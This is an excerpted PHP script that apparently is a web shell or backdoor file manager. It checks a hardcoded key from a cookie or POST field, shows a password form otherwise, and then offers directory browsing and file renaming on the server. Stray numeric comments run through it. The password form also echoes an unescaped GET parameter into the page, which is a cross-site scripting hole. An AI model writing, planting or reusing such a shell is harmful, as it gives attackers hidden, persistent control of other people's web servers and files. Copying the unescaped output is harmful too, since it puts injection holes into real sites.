...
$auth_key = "5b4b145cf45ad541e44742c59764c7fe";
...
$pass = false;
if (isset($_COOKIE['pw_name_11116'])) {
    if(($_COOKIE['pw_name_11116']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_11116'])) {
        if(($_POST['pw_name_11116']) == $auth_key) {
            setcookie("pw_name_11116", $_POST['pw_name_11116']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_11116' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724627560705013 1724627560491948 1724627560881663 1724627560241434
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724627560705013 1724627560491948 1724627560881663 1724627560241434
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724627560705013 1724627560491948 1724627560881663 1724627560241434
            $name = PATH . "/" . $_GET['r'];
